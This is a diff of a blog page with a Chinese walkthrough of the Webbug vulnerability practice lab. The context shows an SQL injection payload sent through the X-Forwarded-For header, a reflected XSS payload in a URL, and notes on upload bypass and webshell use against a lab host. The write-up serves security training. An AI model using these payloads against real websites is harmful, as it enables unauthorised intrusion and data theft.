@@ -28,7 +28,7 @@
 <meta property="og:image" content="http://oizzgpxb7.bkt.clouddn.com/\1522062882333.png">
 <meta property="og:image" content="http://oizzgpxb7.bkt.clouddn.com/\1522063148024.png">
 <meta property="og:image" content="http://oizzgpxb7.bkt.clouddn.com/\1522063211793.png">
-<meta property="og:updated_time" content="2018-03-31T14:15:43.733Z">
+<meta property="og:updated_time" content="2018-03-31T14:22:42.418Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="国产Webbug开源漏洞平台">
 <meta name="twitter:description" content="国产的Webbug开源漏洞平台搞一下~ get注入图片破解信息收集练习——目录端口收集暴力破解练习x-forwarded-for注入支付漏洞垂直越权CSRFurl跳转GET任意文件下载POST任意文件下载无验证上传反射型XSS存储型XSS校验扩展名上传验证来源去向的url跳转文件包含POST文件包含HOST注入APK破解延时注入DZ7.2论坛sql注入aspcms注入phpmyadmin任意文件包">
@@ -221,7 +221,7 @@
 <p>Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）.</p>
 <p>X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）.</p>
 <p>Clien-IP：同上，不做过多介绍.</p>
-<p>Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的.</p>
+<p>Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过    来的.</p>
 <p>Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号(这个我本人还没碰到过，不过有真实存在的案例还是写上吧).</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /pentest/test/1/ HTTP/1.1</span><br><span class="line">Host: 10.102.15.214</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: HFS_SID_=0.630969217978418</span><br><span class="line">Content-Length: 0</span><br><span class="line">X-Forwarded-For:union select 1,flag,3,4 from flag</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
 <h3 id="第六关-这关需要rmb购买哦"><a href="#第六关-这关需要rmb购买哦" class="headerlink" title="第六关:这关需要rmb购买哦"></a>第六关:这关需要rmb购买哦</h3><p>截获数据包进行修改数量  逻辑漏洞</p>
@@ -237,7 +237,7 @@
 <h3 id="第十二关-我系统密码忘记了！"><a href="#第十二关-我系统密码忘记了！" class="headerlink" title="第十二关:我系统密码忘记了！"></a>第十二关:我系统密码忘记了！</h3><p>​    上传漏洞的连接菜刀。</p>
 <p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056297807.png" alt="52205629780"></p>
 <h3 id="第十三关-XSS"><a href="#第十三关-XSS" class="headerlink" title="第十三关:XSS"></a>第十三关:XSS</h3><p>反射型 xss</p>
-<p><a href="http://10.102.15.214/pentest/test/9/?id=" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/9/?id=</a><img src="" onerror="alert(1001)"> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/9/?id=&lt;img src onerror=al ert()&gt;</span><br></pre></td></tr></table></figure>
 <p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056415953.png" alt="52205641595"></p>
 <h3 id="第十四关-存储型XSS"><a href="#第十四关-存储型XSS" class="headerlink" title="第十四关:存储型XSS"></a>第十四关:存储型XSS</h3><p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056469320.png" alt="52205646932"></p>
 <h3 id="第十五关-什么？图片上传不了？"><a href="#第十五关-什么？图片上传不了？" class="headerlink" title="第十五关:什么？图片上传不了？"></a>第十五关:什么？图片上传不了？</h3><p>只验证了Content-Type </p>
